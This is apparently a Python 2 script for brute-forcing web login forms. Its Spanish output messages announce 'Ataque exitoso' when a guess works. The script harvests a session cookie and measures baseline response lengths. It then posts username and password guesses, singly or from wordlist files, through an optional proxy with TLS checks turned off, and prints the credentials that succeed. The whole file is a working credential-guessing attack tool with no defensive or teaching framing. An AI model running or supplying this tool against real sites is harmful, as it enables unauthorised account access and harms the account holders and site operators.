#!/usr/bin/python

import requests
import argparse
import sys
from lxml.html import fromstring
import os.path
from termcolor import colored
import re

def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip):
	b = ['','1','12']
	a = []
	print colored("\nBeginning BruteForce", 'yellow')
	
	requests.packages.urllib3.disable_warnings()
	if len(proxip) == 0:
		req = requests.get(url,verify=False)
	else:
		proxy = proxip  + ':' + proxport
		proxies = {'http' : proxy, 'https' : proxy,}
		req = requests.get(url,proxies = {'http':proxy},verify=False)
	
	if cookie is None:
		for key,value in req.headers.iteritems():
			if 'set-cookie' in key:
				regex = re.compile(r'(OJSSID=)((.*);)')
				match = regex.search(value)
				try:
					if match.group():
						cookie = re.sub(r';(.*)','',match.group(2))
				except:
					print 'nio'
	else:
		pass
		
	if agent is None:
		agent = 'Kakeando'
	else:
		pass

	
	requests.packages.urllib3.disable_warnings()	
	for element in b:
		payload = {userField : element, passField: ''}
		headers = {'user-agent': agent}
		cookies = dict(cookies_are=cookie) 
		if len(proxip) == 0:
			r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
		else:
			proxy = proxip  + ':' + proxport
			proxies = {'http' : proxy, 'https' : proxy,}
			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
		a.append(len(r.content))
	
	if len(userFile) == 0 and len(pwdFile) == 0 and len(user) > 0 and len(pwd) > 0 :
		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
	elif len(user) == 0 and len(pwd) == 0 and len(userFile) > 0 and len(pwdFile) > 0:
		doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
	elif len(user) == 0 and len(pwdFile) == 0 and len(pwd) > 0 and len(userFile) > 0:
		usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
	elif len(pwd) == 0 and len(userFile) == 0 and len(user) > 0 and len(pwdFile) > 0:
		passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
		
def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list):
	
	mbefore = message
	requests.packages.urllib3.disable_warnings()		
		
	payload = { userField : user, passField: pwd}
	
	headers = {'user-agent': agent}
	cookies = dict(cookies_are=cookie) 
	if len(proxip) == 0:
		r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
	else:
		proxy = proxip  + ':' + proxport
		proxies = {'http' : proxy, 'https' : proxy,}
		r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
	
	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Ataque no exitoso ', 'red')
			elif int (verbose) == 2:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
			elif int(verbose) == 3:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			if int(verbose) == 1:
				print colored('Ataque exitoso ', 'green')
			elif int(verbose) == 2:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
			elif int(verbose) == 3:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
	
	elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
		if int(len(r.content)) == list[0] and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Ataque no exitoso ', 'red')
			elif int (verbose) == 2:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
			elif int(verbose) == 3:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			if int(verbose) == 1:
				print colored('Ataque exitoso ', 'green')
			elif int(verbose) == 2:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
			elif int(verbose) == 3:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
	else: # Si no se puede determinar mediante content-lenght
		if mbefore in r.text:
			if int(verbose) == 1:
				print colored('Ataque no exitoso ', 'red')
			elif int (verbose) == 2:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
			elif int(verbose) == 3:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			if int(verbose) == 1:
				print colored('Ataque exitoso ', 'green')
			elif int(verbose) == 2:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
			elif int(verbose) == 3:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
		
		
def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list):
	
	users = []
	requests.packages.urllib3.disable_warnings()		
	
		
	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):	
			mbefore = message
				
			#Login
			payload = { userField : users[i].rstrip('\n'), passField: pwd}
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			if len(proxip) == 0:
				r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
			else:
				proxy = proxip  + ':' + proxport
				proxies = {'http' : proxy, 'https' : proxy,}
				r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
				
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] or mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	

def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list):
	passwords = []
	requests.packages.urllib3.disable_warnings()		
		
	if os.path.exists(pwdFile): #archivo con usuarios
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i].rstrip('\n')}
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			if len(proxip) == 0:
				r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
			else:
				proxy = proxip  + ':' + proxport
				proxies = {'http' : proxy, 'https' : proxy,}
				r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
				
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
			
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
					
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')

	
def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list):
	
	users = []
	passwords = []
	i = 0
	j = 0
	
	requests.packages.urllib3.disable_warnings()		
		
	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
		
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				#Login
				
				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
				headers = {'user-agent': agent}
				cookies = dict(cookies_are=cookie) 
				if len(proxip) == 0:
					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
				else:
					proxy = proxip  + ':' + proxport
					proxies = {'http' : proxy, 'https' : proxy,}
					r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
					
				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Ataque no exitoso ', 'red')
						elif int (verbose) == 2:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						elif int(verbose) == 3:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Ataque exitoso ', 'green')
						elif int(verbose) == 2:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						elif int(verbose) == 3:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')

						
						j + 1
						
				elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
					if int(len(r.content)) == list[0] and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Ataque no exitoso ', 'red')
						elif int (verbose) == 2:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						elif int(verbose) == 3:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Ataque exitoso ', 'green')
						elif int(verbose) == 2:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						elif int(verbose) == 3:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
						j + 1	
				else: # Si no se puede determinar mediante content-lenght
					if mbefore in r.text:
						if int(verbose) == 1:
							print colored('Ataque no exitoso ', 'red')
						elif int (verbose) == 2:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						elif int(verbose) == 3:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
					else:
						if int(verbose) == 1:
							print colored('Ataque exitoso ', 'green')
						elif int(verbose) == 2:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						elif int(verbose) == 3:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')	
		i + 1	
